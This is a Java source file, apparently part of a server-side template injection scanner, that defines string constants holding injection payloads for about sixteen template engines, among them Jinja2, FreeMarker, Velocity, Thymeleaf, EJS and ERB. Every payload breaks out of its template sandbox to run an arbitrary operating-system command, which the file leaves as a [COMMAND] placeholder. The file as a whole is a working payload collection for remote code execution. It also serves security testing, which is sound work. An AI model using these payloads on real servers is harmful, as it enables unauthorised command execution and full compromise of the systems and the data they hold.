package sstiscanner.engines;

public class Payloads {
    static final String JINJA2_PAYLOAD = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"[COMMAND]\").read().zfill(417)}}{%endif%}{% endfor %}";
    static final String MAKO_PAYLOAD = "${self.module.cache.util.os.system(\"[COMMAND]\")}";
    static final String TORNADO_PAYLOAD = "{% import os %}{{ os.popen(\"[COMMAND]\").read() }}";
    static final String SMARTY_PAYLOAD = "{system('[COMMAND]')}";
    static final String TWIG_PAYLOAD = "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"[COMMAND]\")}}";
    static final String FREEMARKER_PAYLOAD = "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"[COMMAND]\")}";
    static final String VELOCITY_PAYLOAD = "#set($engine=\"\")\n" +
            "#set($run=$engine.getClass().forName(\"java.lang.Runtime\"))\n" +
            "#set($runtime=$run.getRuntime())\n" +
            "#set($proc=$runtime.exec(\"[COMMAND]\"))\n" +
            "#set($null=$proc.waitFor())\n" +
            "#set($istr=$proc.getInputStream())\n" +
            "#set($chr=$engine.getClass().forName(\"java.lang.Character\"))\n" +
            "#set($output=\"\")\n" +
            "#set($string=$engine.getClass().forName(\"java.lang.String\"))\n" +
            "#foreach($i in [1..$istr.available()])\n" +
            "#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))\n" +
            "#end\n";
    static final String THYMELEAF_PAYLOAD = "[[${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(\"[COMMAND]\").waitFor()}]]";
    static final String NUNJUCKS_PAYLOAD = "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('[COMMAND]')\")()}}";
    static final String DOT_PAYLOAD = "{{= global.process.mainModule.require('child_process').execSync('[COMMAND]').toString() }}";
    static final String EJS_PAYLOAD = "<%=global.process.mainModule.require('child_process').execSync('[COMMAND]').toString()%>";
    static final String VUEJS_PAYLOAD = "{{constructor.constructor(\"global.process.mainModule.require('child_process').execSync('[COMMAND]').toString()\")()}}";
    static final String JADE_PAYLOAD = "#{global.process.mainModule.require('child_process').execSync('[COMMAND]').toString()}";
    static final String SLIM_PAYLOAD = "#{%x( [COMMAND] )}";
    static final String ERB_PAYLOAD = "<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('[COMMAND]') %><%= @b.readline()%>";
    static final String RAZOR_PAYLOAD = "@{ System.Diagnostics.Process.Start(\"[COMMAND]\"); }";
}
